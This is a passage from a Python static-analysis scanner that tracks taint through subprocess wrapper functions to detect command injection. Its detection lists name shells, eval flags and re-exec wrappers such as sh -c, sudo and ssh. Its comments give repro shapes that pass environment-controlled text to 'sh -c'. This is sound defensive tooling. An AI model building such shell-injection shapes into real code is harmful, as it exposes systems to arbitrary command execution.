    local before the call (`cmd = [prog, *args]; subprocess.run(cmd)`) rather than
    passed inline. Conservative: a name reassigned, index-assigned, or `insert`-mutated
    is omitted, so the caller falls back to the command-injection default rather than
    risk a false downgrade.
    """
    assign_count: dict[str, int] = {}
    bindings: dict[str, ast.List | ast.Tuple] = {}
    unsafe: set[str] = set()
    for n in _scope_own_nodes(scope):
        if isinstance(n, ast.Assign):
            for t in n.targets:
                if isinstance(t, ast.Name):
                    assign_count[t.id] = assign_count.get(t.id, 0) + 1
                    if isinstance(n.value, (ast.List, ast.Tuple)):
                        bindings[t.id] = n.value
                    else:
                        unsafe.add(t.id)  # bound to a non-literal -> unresolvable
                elif isinstance(t, ast.Subscript) and isinstance(t.value, ast.Name):
                    unsafe.add(t.value.id)  # cmd[0] = ... could replace the program
        elif isinstance(n, ast.Call):
            f = n.func
            if (
                isinstance(f, ast.Attribute)
                and f.attr == "insert"
                and isinstance(f.value, ast.Name)
            ):
                unsafe.add(f.value.id)  # cmd.insert(0, ...) could shift argv[0]
    return {k: v for k, v in bindings.items() if assign_count.get(k, 0) == 1 and k not in unsafe}


def _list_bindings_by_call(tree: ast.AST) -> dict[ast.Call, dict[str, ast.List | ast.Tuple]]:
    """Map each Call node to the single-list-bindings visible in its enclosing scope
    (module scope for top-level calls). Per-scope so a local name reused across sibling
    functions is not conflated into ambiguity."""
    out: dict[ast.Call, dict[str, ast.List | ast.Tuple]] = {}
    scopes = [tree] + [
        n for n in ast.walk(tree) if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef))
    ]
    for scope in scopes:
        binds = _single_list_bindings_local(scope)
        for n in _scope_own_nodes(scope):
            if isinstance(n, ast.Call):
                out[n] = binds
    return out


# B-413 layer 2 safety cap: a wrapper function with more intra-file call sites than
# this is treated as UNRESOLVABLE (stays crit) rather than scanned in full -- a hard
# cap on cost, not a soft one. Exposed as a module constant so tests can monkeypatch
# a small threshold instead of generating 200+ call sites.
_MAX_WRAPPER_CALL_SITES = 200


def _param_argv_call_sites(
    fn: ast.AST, param_name: str, tree: ast.AST, owner_map: dict
) -> list | None:
    """B-413 layer 2: the argument expression bound to `fn`'s `param_name` at EVERY
    intra-file call to `fn` -- the call-site view of the ordinary, encouraged wrapper
    idiom (`def run(cmd): subprocess.check_call(cmd, cwd=ROOT)`) that a purely
    intra-function taint model (layer 1) cannot clear, since the parameter genuinely
    IS tainted in `fn`'s own scope (that part of layer 1 is correct); only the CALL
    SITES can prove every real invocation is actually safe.

    Returns None (unresolvable -> the caller must stay conservative / crit) whenever
    anything about the binding cannot be proven safe by a simple, SOUND static match
    -- soundness here means "never wrongly conclude safe", so every ambiguous case
    bails rather than guesses:

      * `fn` is not a bare top-level FunctionDef/AsyncFunctionDef (a nested function
        or a class method is out of scope for this narrow fix);
      * `fn` itself takes `*args`/`**kwargs` (the position of `param_name` cannot be
        pinned down for every caller);
      * `fn`'s name is not unique at module level (two top-level defs sharing a name
        -- which real caller means?);
      * `param_name` cannot be located in `fn`'s own positional/keyword-or-positional/
        keyword-only parameter list;
      * `fn`'s bare NAME is referenced anywhere in the file OTHER than as the `func`
        of a Call to it -- passed as a value/callback/re-assigned (`f = run`) is an
        indirect call this walk cannot see, so it must not silently ignore it;
      * ANY call site to `fn` uses `*args`/`**kwargs` unpacking -- positional
        resolution is not safe to assume;
      * a call site does not bind `param_name` at all (relies on `fn`'s own default
        value) -- not modelled here, bail rather than assume the default is safe;
      * more than `_MAX_WRAPPER_CALL_SITES` intra-file call sites (a hard cost cap);
      * ZERO call sites are found -- load-bearing: a helper with no intra-file caller
        is genuinely unknown from outside the file and MUST stay crit.

    This walk is deliberately NOT scope-precise about which `fn`-named reference goes
    with which `fn` (it matches every `ast.Name(id=fn.name)` in the whole file, not
    just ones actually resolving to `fn` under Python's real scoping) -- a same-named
    nested closure or unrelated local could, in principle, add noise. That noise can
    only make this MORE conservative (an extra call site or an extra "used as a
    value" hit only ever pushes the result toward None/False, i.e. toward staying
    crit), never less -- so it stays sound without needing full scope resolution here.
    """
    if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
        return None
    if fn not in getattr(tree, "body", []):
        return None  # not a bare top-level function
    args = fn.args
    # B-655 (gap 1b): the blanket "fn takes *args/**kwargs -> bail" was sound for an
    # ORDINARY parameter (its position genuinely cannot be pinned down once a
    # `*args`/`**kwargs` unpack could appear at a call site) but does not hold when
    # `param_name` IS the vararg itself: its binding at every call site is exactly
    # "every positional argument from index len(positional_names) onward", and a
    # `**kwargs` unpack at a CALL SITE (as opposed to in fn's own signature) is
    # already bailed on below regardless of which param is being resolved. So the
    # vararg case gets its own narrow carve-out; every other multi-star shape still
    # bails exactly as before.
    is_vararg_param = args.vararg is not None and args.vararg.arg == param_name
    if (args.vararg or args.kwarg) and not is_vararg_param:
        return None

    fn_name = fn.name
    toplevel_defs_named = [
        n
        for n in tree.body
        if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef)) and n.name == fn_name
    ]
    if len(toplevel_defs_named) != 1:
        return None  # name not unique at module level

    positional_names = [a.arg for a in (*args.posonlyargs, *args.args)]
    kwonly_names = {a.arg for a in args.kwonlyargs}
    vararg_start = None
    if is_vararg_param:
        vararg_start = len(positional_names)  # everything from here on binds to *args
        pos_index = None
    elif param_name in positional_names:
        pos_index = positional_names.index(param_name)
    elif param_name in kwonly_names:
        pos_index = None  # keyword-only -- must be bound by keyword at every call site
    else:
        return None

    all_name_refs = [n for n in ast.walk(tree) if isinstance(n, ast.Name) and n.id == fn_name]
    all_calls = [
        n
        for n in ast.walk(tree)
        if isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id == fn_name
    ]
    call_func_ids = {id(c.func) for c in all_calls}
    for ref in all_name_refs:
        if id(ref) not in call_func_ids:
            return None  # used as a value somewhere other than Call.func -- bail

    if not all_calls:
        return None  # zero call sites -- stays crit, load-bearing
    if len(all_calls) > _MAX_WRAPPER_CALL_SITES:
        return None  # cost cap -- stays crit

    bound_exprs: list = []
    for call in all_calls:
        if any(isinstance(a, ast.Starred) for a in call.args):
            return None
        if any(kw.arg is None for kw in call.keywords):  # **kwargs unpack at the call
            return None
        if is_vararg_param:
            # No keyword form exists for a vararg -- synthesize one ast.List out of
            # every positional call argument past fn's own leading positional
            # params, and hand it to the EXISTING `_all_call_sites_bind_fixed_argv`
            # unchanged (same literal-argv / argv0-shell-indirect-exec rules a
            # non-vararg wrapper already gets, including the retracted-and-narrowed
            # "sh -c <tainted>" case). A call passing fewer args than
            # `vararg_start` yields an empty slice, not an IndexError; an empty
            # synthesized List is then treated as unresolvable by
            # `_all_call_sites_bind_fixed_argv` (its own "not resolved.elts" guard)
            # -- conservative, not a crash.
            #
            # C-135: a synthesized node is not in `owner_map` (it was built by
            # walking the REAL tree before this node existed), and
            # `_all_call_sites_bind_fixed_argv` resolves taint VISIBILITY by
            # `owner_map.get(expr)` -- an unregistered node reads as module scope
            # only, silently dropping a caller-local tainted variable (reproduced:
            # `payload = os.environ["X"]; sh("sh", "-c", payload)` cleared to
            # non-crit before this line existed, the exact "sh -c <tainted>"
            # regression B-413 layer 2 exists to catch). Registering the synthetic
            # node under the CALL's own owning scope makes it resolve exactly like
            # the real, non-synthetic list a non-vararg call site already gets.
            synthetic = ast.List(elts=list(call.args[vararg_start:]), ctx=ast.Load())
            owner_map[synthetic] = owner_map.get(call)
            bound_exprs.append(synthetic)
            continue
        kw_match = next((kw.value for kw in call.keywords if kw.arg == param_name), None)
        if kw_match is not None:
            bound_exprs.append(kw_match)
            continue
        if pos_index is None:
            return None  # keyword-only param not passed by keyword here -- relies on
            # fn's own default; not modelled, bail rather than assume it is safe
        if pos_index < len(call.args):
            bound_exprs.append(call.args[pos_index])
        else:
            return None  # relies on fn's default value -- not modelled, bail
    return bound_exprs


# B-413 layer 2 (C-135 round 1, self-review at implementation time): checking only
# argv[0] for taint was RETRACTED-AND-NARROWED here after an independent adversarial
# pass proved it a real, reproducible false-negative regression, not just a
# theoretical gap. When argv[0] names a shell or another indirect-execution
# interpreter, the REST of the argv list is not inert execve data -- it is text the
# interpreter itself parses and runs, so a tainted value anywhere in argv[1:] is
# genuine command injection even though argv[0] is a hardcoded, innocuous-looking
# literal. Concrete repro that motivated this: `def run(cmd): subprocess.check_call
# (cmd)` called as `run(["sh", "-c", os.environ["WEBHOOK_PAYLOAD"]])` -- argv[0] is
# the constant "sh", so the pre-fix check certified the call site "fixed" and
# downgraded a CRITICAL command injection to an informational finding.
#
# C-135 (2nd round, self-caught in integration): a first cut of this fix treated
# EVERY invocation of a general-purpose interpreter (python/perl/ruby/node/...) as
# dangerous whenever ANY later argv element was tainted -- but `python -m edge_tts
# --text {text} --voice {voice}` (a real, previously-correctly-PASSing fixture,
# clean_b13_fixed_argv_subprocess) passes `text`/`voice` as ORDINARY CLI ARGUMENTS
# to a well-behaved module, not as code for python to execute; that flipped a
# genuinely safe skill to FAIL. Fixed by splitting into two categories:
#   * _SHELL_EVAL_FLAG_INTERPRETERS -- general scripting-language interpreters and
#     shells that CAN take an "execute this string as code" flag but usually don't;
#     these only count as dangerous when such a flag (_EVAL_FLAG_NAMES) is ALSO
#     present somewhere in the argv, matching the exact "sh -c <tainted>" shape that
#     motivated this fix without over-matching ordinary "<interpreter> script.py
#     --flag value" invocations.
#   * _REEXEC_WRAPPER_NAMES -- commands whose basic invocation shape already treats
#     everything after argv[0] (or, for `find`, everything after `-exec`) as a
#     command to run, with no extra flag needed: `env CMD ARGS...`, `sudo CMD
#     ARGS...`, `ssh HOST CMD` are dangerous by construction, not merely "can be
#     misused via a flag".
_SHELL_EVAL_FLAG_INTERPRETERS = frozenset({
    "sh", "bash", "zsh", "ksh", "dash", "csh", "tcsh", "ash",
    "cmd", "cmd.exe", "powershell", "powershell.exe", "pwsh",
    "python", "python2", "python3", "perl", "ruby", "php", "node", "deno",
})
_EVAL_FLAG_NAMES = frozenset({"-c", "-e", "--eval", "/c", "-command", "--command"})
_REEXEC_WRAPPER_NAMES = frozenset({"env", "sudo", "doas", "nohup", "ssh"})


def _argv0_is_shell_indirect_exec(elts: list) -> bool:
    """True when literal argv[0] of *elts* names a shell/interpreter or another
    program whose invocation shape means LATER argv elements are not inert execve
    data -- either it always re-execs its trailing args as a new command
    (`_REEXEC_WRAPPER_NAMES`), or it is a scripting interpreter/shell actually
    invoked with an explicit "run this string" flag (`_SHELL_EVAL_FLAG_INTERPRETERS`
    + `_EVAL_FLAG_NAMES` present somewhere in the SAME argv) -- an interpreter
    invoked WITHOUT such a flag (`python -m mod --flag value`) is an ordinary
    program call whose own args are just data to it, not code."""
    if not elts:
        return False
    prog = elts[0]
    if not isinstance(prog, ast.Constant) or not isinstance(prog.value, str):
        return False
    basename = prog.value.rsplit("/", 1)[-1].rsplit("\\", 1)[-1].lower()
    if basename in _REEXEC_WRAPPER_NAMES:
        return True
    if basename in _SHELL_EVAL_FLAG_INTERPRETERS:
        return any(
            isinstance(e, ast.Constant)
            and isinstance(e.value, str)
            and e.value.lower() in _EVAL_FLAG_NAMES
            for e in elts[1:]
        )
    return False


def _all_call_sites_bind_fixed_argv(
    bound_exprs: list,
    list_bindings_by_call: dict,
    owner_map: dict,
    ext_taint_map: dict,
    parent_scope: dict,
    shadow_cache: dict,
    ref_res: "_RefResolver | None" = None,
) -> bool:
    """B-413 layer 2: True iff EVERY expression in `bound_exprs` (from
    `_param_argv_call_sites`) is provably a hardcoded command: a non-empty literal
    List/Tuple (inline, or a bare Name resolved through the EXISTING
    `_single_list_bindings_local`/`_list_bindings_by_call` machinery) whose
    program-name element (argv[0]) is untainted in the CALLING scope's own visible
    taint set -- AND, when argv[0] is itself a shell/indirect-execution interpreter
    (`_argv0_is_shell_indirect_exec`), every OTHER element is untainted too, since
    the interpreter re-parses them as its own command text. A single unresolvable,
    empty, or tainted call site fails the whole check -- the wrapper's parameter
    stays crit.

    Name resolution reuses `list_bindings_by_call` (already computed once per file by
    the caller, passed in here -- never recomputed) by re-keying its existing
    per-CALL entries by SCOPE instead of by call node: `owner_map.get(call_node) is
    owner_map.get(expr)` always holds for an `expr` that is a direct argument of
    `call_node` (both are visited in the same scope-subtree walk in
    `_build_toplevel_owner_map`), so this is a free re-index of already-computed
    `_single_list_bindings_local` results, not a new computation of them.

    B-906: `ref_res`, optional, adds `ref_res.source_in(elt)` alongside each
    `_names_in(elt) & visible` check below -- NEVER the spelling vocabulary
    (`_value_is_tainted_source`/`_rhs_has_subscript_environ`) some prior fix rounds
    wrongly imported into this inline position (see `_RefResolver`'s module note).
    Either disjunct failing this call site's "provably hardcoded" proof only makes
    the whole check MORE conservative (returns False sooner), so this can only ever
    keep the wrapper's parameter crit in a case it used to wrongly clear, never the
    reverse.
    """
    if not bound_exprs:
        return False
    scope_bindings: dict = {}
    for call_node, binds in list_bindings_by_call.items():
        scope_bindings.setdefault(owner_map.get(call_node), binds)

    for expr in bound_exprs:
        resolved = expr
        if isinstance(expr, ast.Name):
            binds = scope_bindings.get(owner_map.get(expr))
            if binds:
                resolved = binds.get(expr.id, expr)  # resolve a var-bound command list
        if not isinstance(resolved, (ast.List, ast.Tuple)) or not resolved.elts:
            return False  # unresolvable or empty -- not provably a fixed command
        prog = resolved.elts[0]
        visible = _tainted_names_visible(expr, ext_taint_map, owner_map, parent_scope, shadow_cache)
        if (_names_in(prog) & visible) or (ref_res is not None and ref_res.source_in(prog)):
            return False  # tainted program name at THIS call site -> stays crit
        if _argv0_is_shell_indirect_exec(resolved.elts):
            rest_names = set()
            for elt in resolved.elts[1:]:
                rest_names |= _names_in(elt)
            if (rest_names & visible) or (
                ref_res is not None and any(ref_res.source_in(e) for e in resolved.elts[1:])
            ):
                return False  # tainted arg handed to a shell/interpreter -> stays crit
    return True


def _name_rebound_anywhere(tree: ast.AST, name: str) -> bool:
    """B-655 (C-135): True if `name` (a builtin this module is about to trust, e.g.
    "list"/"tuple") is rebound ANYWHERE in the file -- a def/class of that name, an
    assignment/for/with/walrus/except/import target, or a function parameter.

    Whole-file and NOT scope-precise, on purpose -- the same conservative-only
    philosophy `_param_argv_call_sites`'s own name-reference walk already documents:
    a rebinding inside a scope that could never actually reach the call site being
    checked still counts here, which only ever makes a caller MORE conservative
    (refuse to trust the builtin), never less, so this stays sound without needing
    full scope resolution. Comprehension/match-statement binding forms are not
    walked (`ast.MatchAs`/`ast.MatchStar`, a comprehension's own `for`-target) --
    accepted as a narrower gap than the one this closes: shadowing a BUILTIN NAME
    from inside one of those forms is materially more contrived than the plain
    `def list(...)`/`list = ...` shapes this exists to catch.
    """
    for node in ast.walk(tree):
        if (
            isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef))
            and node.name == name
        ):
            return True
        if isinstance(node, (ast.Import, ast.ImportFrom)):
            for alias in node.names:
                if (alias.asname or alias.name) == name:
                    return True
        if isinstance(node, ast.arg) and node.arg == name:
            return True
        if (
            isinstance(node, ast.Name)
            and isinstance(node.ctx, (ast.Store, ast.Del))
            and node.id == name
        ):
            return True
    return False


# ---------------------------------------------------------------------------
# B-863: TT5 vararg/param wrapper guard, made position-aware without an
# unsound Q-content/Q-position conflation (see the design note above
# `_param_argv_call_sites` for the history of the three retracted rounds this
# replaces). Two tiers:
#
#   Tier 1 (content-independent): the wrapper's own body reassigns/mutates the
#   parameter, but every REAL call site passes only literal constants, AND no
#   external taint reaches the parameter through anything OTHER than its own
#   trivial per-function parameter taint (`_b863_m_for` -- the same fixpoint
#   as `_external_tainted_names`, but with the parameter excluded from its own
#   seed so the question becomes "is there some OTHER source"), AND the
#   parameter never escapes to an in-file callee or a container. When all
#   three hold, POSITION cannot matter -- nothing attacker-controlled is ever
#   in the value at all -- so the call is exactly as safe as the byte-
#   identical inline call, matching the B13 argument-injection rule (info).
#
#   Tier 2 (position-only, once tier 1 does not apply): a closed grammar of
#   "channels" that can touch the parameter -- reassignment to a head-
#   preserving expression (H) or a fresh literal (F, optionally F+X),
#   .append()/.extend()/.insert(len(P), x)/a bare .copy(), and read-only uses
#   -- classifies whether the final value's argv[0] is provably the SAME
#   program the call site (or a fresh literal) names, and whether any
#   attacker-reachable content ever lands after a shell/interpreter argv[0].
#   Any shape outside that grammar (position-unsafe methods, subscript/slice
#   stores, aliasing into a mutated name, an in-file callee, ...) is
#   conservatively unresolvable -> crit, the same "unresolvable stays crit"
#   discipline `_param_argv_call_sites` itself already uses.
#
# Deviation from the architect's design: T1b's "propagate_mutation" fixpoint
# is implemented here as `_b863_m_for`, a wrapper that calls the EXISTING,
# unmodified `_external_tainted_names` repeatedly with an expanding seed
# (mirroring the architect's own proto2.py prototype almost verbatim), rather
# than adding an internal `propagate_mutation` flag inside
# `_external_tainted_names` itself. `_external_tainted_names` is relied on by
# TT4/SSRF as well as TT5; keeping it byte-for-byte unchanged and building the
# mutation-aware fixpoint as a pure wrapper removes any risk of a regression
# there, at the cost of one extra small function. Confirmed to reproduce
# proto2.py's per-case answer on all 57 harness cases.
#
# Fix round 1 (C-135, 2026-09-23): the tier-2 channel walk used to thread ONE
# shared `shapes` list through the whole of `names` -- every name the walk
# ever called an "alias" (`_b863_classify_head` returning true for its RHS)
# was treated as pointing at the SAME evolving value, forever. That is wrong
# the instant two tracked names DIVERGE: `x = args` truly does make `x` and
# `args` the same object, but a LATER `args = ["sh", "-c"]` (or `x = ["ls"]`)
# rebinds only ONE of them, and the walk kept folding every subsequent
# mutation of EITHER name onto the single shared list regardless of which
# object it actually touched at runtime -- a false positive when a stale
# alias's mutation got attributed to the freshly-rebound name (reviewer's
# side A: `x` mutated after `args` was rebound away from it, wrongly tainting
# the NEW `args`), and a lost detection the other way around (reviewer's side
# B: the TRACKED parameter's own later mutation got attributed to a sibling
# alias's unrelated rebind instead, because the one shared list had just been
# replaced wholesale by that sibling's own reassignment). Both are the same
# root cause -- named aliases sharing one mutable list is only sound while
# they are not yet aliases of DIFFERENT values -- so `names` (a flat set,
# still used for pure membership tests: "is this identifier currently
# tracked at all") is now paired with `shapes_of`, a `dict[str,
# list[_B863Shape]]` giving every tracked name its OWN shapes-list slot.
# Creating a new alias (`y = <H-preserving-expr-of-x>`) points `y`'s slot at
# the SAME list object `x` already uses (true aliasing: a mutation through
# either name is visible through the other, exactly as at runtime). A full
# reassignment of a tracked name (`x = ["sh", "-c"]`, or any other RHS
# `_b863_classify_assign_value` accepts) replaces ONLY that name's own dict
# entry with a brand-new list -- every OTHER name that used to share the old
# list keeps its own reference to that OLD list, untouched, so a later
# mutation through either name can no longer cross-contaminate the other.
# `_b863_classify_head` is threaded through as returning the SPECIFIC
# resolved source name (or None) rather than a bare bool, precisely so alias
# creation knows WHICH existing slot to share.
#
# Fix round 2 (C-135, 2026-09-23): round 1 gave every tracked name its own
# `shapes_of[...]` slot, but `_b863_classify_assign_value` -- the function
# that computes what a REASSIGNMENT's own new slot should hold -- still
# manufactured a brand-new, unrelated blank `_B863Shape` whenever the RHS was
# a bare already-tracked Name or a `_b863_classify_head`-resolved expression,
# instead of reading the resolved name's OWN, already-correct `shapes_of[...]`
# entry. That is unsound the instant the resolved name still shares a
# `_B863Shape` object with a THIRD, still-live alias: `args = ["ls"] if
# len(payload) > 3 else args` re-evaluates the CURRENT `args` in its `else`
# arm, which at runtime is the exact object a prior `x = args` still aliases;
# fabricating a fresh blank shape there detaches that arm from `x`, so a
# later `x.append(payload)` becomes invisible to it (lost detection). Fixed:
# `_b863_classify_assign_value` now takes `shapes_of` and both branches
# return `list(shapes_of[resolved_name])` -- a new list wrapper (so a later
# full reassignment of `tgt.id` alone still only replaces `tgt.id`'s own dict
# entry) around the SAME `_B863Shape` object(s), preserving true aliasing for
# any name that still shares one. See `_b863_classify_assign_value`'s own
# docstring for the detailed trace.
#
# Fix round 3 (C-135, 2026-09-24): round 2's "return the resolved name's own
# current shapes" correction was applied to BOTH branches of
# `_b863_classify_assign_value` alike, but only ONE of them is actually a
# same-object case. The bare-Name branch (`args = x`) is sound to
# reference-share: at runtime `args` and `x` become the exact same list
# object, so a later mutation through either name must stay visible through
# the other. The `head_src` branch, however, is reached ONLY via
# `_b863_classify_head`'s non-Name grammar -- `list(H)`/`tuple(H)`, `H.copy()`,
# a full slice `H[:]`, `H+X`, `[*H, ...]`, or an identity-map comprehension --
# and every one of those constructs a BRAND NEW object at runtime. Reference-
# sharing there wrongly keeps the NEW object coupled to whatever a stale
# alias of the OLD object goes on to mutate (`args = list(args)` after
# `x = args` decouples `x` from the new `args` in reality, but round 2's fix
# kept them coupled in the analysis -- a false positive). Fixed by giving the
# `head_src` branch its own independent snapshot: a fresh `_B863Shape` object
# per entry (the same per-shape copy idiom `_b863_copy_shapes_of` already uses
# for branch merges), instead of the reference-sharing `list(shapes_of[...])`
# the bare-Name branch correctly keeps. This only ever REMOVES an incidental,
# unsound coupling between two objects that are distinct at runtime; it
# cannot lose a genuine same-object aliasing relationship, because the
# bare-Name branch (the only case where two names truly share one runtime
# object post-assignment) is untouched.
_B863_HEAD_WRAP_CALLS = frozenset({"list", "tuple"})
_B863_IDENTITY_MAP_NAMES = frozenset({"str"})
_B863_IDENTITY_MAP_ATTRS = frozenset({"fspath", "fsdecode"})
# Cost cap on conditional branch-merge shape multiplication -- see the `ast.If`
# branch of `_b863_process_one`. The 57-case matrix never exceeds 1 independent
# conditional; this task's own real-corpus differential found a legitimate,
# common idiom (a CLI-argument builder with several independent `if opt:
# cmd.append(...)` guards) with up to 6, i.e. 64 shapes -- 512 keeps meaningful
# headroom above that (9 independent conditionals) while still bounding a truly
# pathological file's cost.
_B863_MAX_SHAPES = 512


class _B863OutOfDomain(Exception):
    """Raised by the tier-2 channel walk the instant a statement touches a
    tracked name in a shape outside the recognised H/F/append/extend/insert(
    len(P))/copy grammar -- caught by both the tier-2 collector (-> crit) and
    T1c (-> only escape-shaped reasons disprove T1c; any other reason leaves
    T1a/T1b free to still clear the call as content-safe)."""


class _B863Shape:
    """One possible post-processing shape of a tracked parameter's value:
    `fresh` False means "whatever the call site's own R_c is" (a head-
    preserving derivation); True means a fresh literal starting at `a0` (its
    own program-name element). `content` accumulates, in order, every
    append/extend/insert(len(P),x) addition and (for a fresh literal) the
    literal's own remaining elements. `refs_callsite` is set when a fresh
    literal's construction referenced the tracked name directly (`F + P`) --
    at runtime that tail IS the call site's own R_c, so R_c is folded into
    `content` for that shape's own evaluation (never a blanket taint check on
    the parameter's own name, which would be trivially "tainted" via ordinary
    per-function parameter taint and defeat the whole point of this design)."""

    __slots__ = ("fresh", "a0", "content", "refs_callsite")

    def __init__(self, fresh, a0, content, refs_callsite):
        self.fresh = fresh
        self.a0 = a0
        self.content = list(content)
        self.refs_callsite = refs_callsite

    def add_content(self, node):
        self.content.append(node)


def _b863_attr_is_os_identity_map(node):
    return (
        isinstance(node, ast.Attribute)
        and node.attr in _B863_IDENTITY_MAP_ATTRS
        and _attr_base(node.value) == "os"
    )


def _b863_classify_head(expr, names, tree):
    """The SPECIFIC name in `names` that *expr* provably preserves argv[0]
    of, or None if *expr* is not head-preserving at all -- structural, not a
    value simulation: every branch reduces to "does the innermost reference
    resolve to a tracked name, and which one". Grammar: P; list(H)/tuple(H);
    H.copy(); H[:] (a full slice only); H+X; [*H, ...]; [t for t in H] /
    [g(t) for t in H] for a single, filterless, synchronous generator with g
    one of str/os.fspath/os.fsdecode.

    Returning the resolved name (not a bare bool) is fix-round-1 (C-135,
    2026-09-23): the caller needs to know WHICH existing tracked name's
    shapes-list slot a newly-created alias should share, now that different
    tracked names can hold DIFFERENT shapes lists after one of them diverges
    (see the module comment above `_B863OutOfDomain`)."""
    if isinstance(expr, ast.Name):
        return expr.id if expr.id in names else None
    if isinstance(expr, ast.Call):
        f = expr.func
        if (
            isinstance(f, ast.Name)
            and f.id in _B863_HEAD_WRAP_CALLS
            and not _name_rebound_anywhere(tree, f.id)
            and len(expr.args) == 1
            and not expr.keywords
            and not any(isinstance(a, ast.Starred) for a in expr.args)
        ):
            return _b863_classify_head(expr.args[0], names, tree)
        if isinstance(f, ast.Attribute) and f.attr == "copy" and not expr.args and not expr.keywords:
            return _b863_classify_head(f.value, names, tree)
        return None
    if isinstance(expr, ast.Subscript):
        sl = expr.slice
        if isinstance(sl, ast.Slice) and sl.lower is None and sl.upper is None and sl.step is None:
            return _b863_classify_head(expr.value, names, tree)
        return None
    if isinstance(expr, ast.BinOp) and isinstance(expr.op, ast.Add):
        return _b863_classify_head(expr.left, names, tree)
    if isinstance(expr, ast.List) and expr.elts and isinstance(expr.elts[0], ast.Starred):
        return _b863_classify_head(expr.elts[0].value, names, tree)
    if isinstance(expr, (ast.ListComp, ast.GeneratorExp)):
        if len(expr.generators) != 1:
            return None
        gen = expr.generators[0]
        if gen.is_async or gen.ifs:
            return None
        if not isinstance(gen.target, ast.Name):
            return None
        src = _b863_classify_head(gen.iter, names, tree)
        if src is None:
            return None
        elt = expr.elt
        if isinstance(elt, ast.Name) and elt.id == gen.target.id:
            return src
        if (
            isinstance(elt, ast.Call)
            and len(elt.args) == 1
            and not elt.keywords
            and isinstance(elt.args[0], ast.Name)
            and elt.args[0].id == gen.target.id
            and (
                (
                    isinstance(elt.func, ast.Name)
                    and elt.func.id in _B863_IDENTITY_MAP_NAMES
                    and not _name_rebound_anywhere(tree, elt.func.id)
                )
                or _b863_attr_is_os_identity_map(elt.func)
            )
        ):
            return src
        return None
    return None


def _b863_flatten_fresh(expr, names, tree):
    """None if *expr* is not F-shaped (a non-empty, non-Starred-headed List/
    Tuple literal, or F+X); else (a0_node, rest_nodes, references_names) --
    `rest_nodes` is the literal's own remaining elements (flattened through a
    nested F+F chain), and `references_names` is True the moment a tracked
    name appears bare as the RIGHT operand of a `+` -- at runtime that is the
    call site's own R_c (see `_B863Shape.refs_callsite`)."""
    if isinstance(expr, ast.BinOp) and isinstance(expr.op, ast.Add):
        left = _b863_flatten_fresh(expr.left, names, tree)
        if left is None:
            return None
        a0, rest, refs = left
        right = expr.right
        if isinstance(right, ast.Name) and right.id in names:
            return a0, rest, True
        if isinstance(right, (ast.List, ast.Tuple)) and not (
            right.elts and isinstance(right.elts[0], ast.Starred)
        ):
            r = _b863_flatten_fresh(right, names, tree)
            if r is not None:
                r_a0, r_rest, r_refs = r
                return a0, rest + [r_a0] + r_rest, refs or r_refs
            return a0, rest + list(right.elts), refs
        return a0, rest + [right], refs
    if (
        isinstance(expr, (ast.List, ast.Tuple))
        and expr.elts
        and not isinstance(expr.elts[0], ast.Starred)
    ):
        return expr.elts[0], list(expr.elts[1:]), False
    return None


def _b863_classify_assign_value(value, names, tree, shapes_of):
    """Classify an Assign/reassign RHS into a list of `_B863Shape` (usually
    one; two for an IfExp / `or`-join whose branches are each H or F), or
    None if it fits neither grammar -- the caller treats None as out of
    domain.

    Fix round 2 (C-135, 2026-09-23): the bare-Name and `_b863_classify_head`
    branches used to return a brand-new BLANK shape (`_B863Shape(False, None,
    [], False)`) whenever the RHS was itself a tracked name (self-reassign,
    e.g. `args = list(args)`) or resolved head-preservingly to one (e.g.
    `args = x`) -- discarding whatever that resolved name's OWN current
    `shapes_of[...]` entry already held, including any `_B863Shape` object it
    shares by true aliasing with a still-live sibling name. That is the exact
    root cause of this round's regression: in `args = ["ls"] if len(payload)
    > 3 else args`, the IfExp's `else` arm is the bare Name `args`, and at
    runtime that arm literally re-evaluates the CURRENT `args` -- the same
    object `x` (aliased earlier via `x = args`) still refers to. Returning a
    fresh blank shape there manufactures a NEW `_B863Shape` object with no
    relationship to `shapes_of['x']`, so the later `x.append(payload)`
    mutates an object the reassigned `args`'s else-branch shape can no longer
    see, and the finding is lost. Both branches now return
    `list(shapes_of[resolved_name])` instead: a fresh LIST wrapper (so a full
    reassignment of `tgt.id` afterwards replaces only `tgt.id`'s own dict
    entry, per the fix-round-1 invariant above) around the SAME `_B863Shape`
    object(s) `resolved_name` currently holds -- so a later mutation through
    any name still sharing one of those objects (by true aliasing, per
    `_b863_process_one`'s alias-creation branch) is visible wherever that
    object is reachable, exactly as at runtime. Since `shapes_of[value.id]`
    is read from the CALLER's still-current state (the caller only replaces
    `shapes_of[tgt.id]` with our return value AFTER we return), the
    self-reassign case (`resolved_name == tgt.id`) correctly sees the
    PRE-reassignment shapes -- RHS evaluation happens before the store, same
    as Python's own assignment semantics.

    Fix round 3 (C-135, 2026-09-24): the fix above is only sound for a bare
    Name RHS (`args = x`), where the reassigned name and the resolved name
    become the SAME object at runtime, so reference-sharing their shapes is
    correct. It is NOT sound for the `head_src` branch below: every non-Name
    shape `_b863_classify_head` recognises (`list(H)`/`tuple(H)`, `H.copy()`,
    a full slice `H[:]`, `H+X`, `[*H, ...]`, an identity-map comprehension)
    constructs a BRAND NEW object at runtime, decoupled from whatever `H`
    itself goes on to alias or mutate afterwards. `args = list(args)` after
    `x = args` must decouple `x` from the new `args` -- a later
    `x.append(payload)` cannot reach it. Reference-sharing there (as round 2
    did, over-generalizing this fix to both branches) kept them wrongly
    coupled in the analysis. Fixed: the `head_src` branch now returns an
    independent snapshot -- a fresh `_B863Shape` per entry, the same
    per-shape copy idiom `_b863_copy_shapes_of` already uses for branch
    merges -- instead of `list(shapes_of[head_src])`'s reference-sharing."""
    if isinstance(value, ast.Name) and value.id in names:
        return list(shapes_of[value.id])
    fresh = _b863_flatten_fresh(value, names, tree)
    if fresh is not None:
        a0, rest, refs = fresh
        return [_B863Shape(True, a0, rest, refs)]
    head_src = _b863_classify_head(value, names, tree)
    if head_src is not None:
        return [
            _B863Shape(sh.fresh, sh.a0, sh.content, sh.refs_callsite)
            for sh in shapes_of[head_src]
        ]
    if isinstance(value, ast.IfExp):
        left = _b863_classify_assign_value(value.body, names, tree, shapes_of)
        right = _b863_classify_assign_value(value.orelse, names, tree, shapes_of)
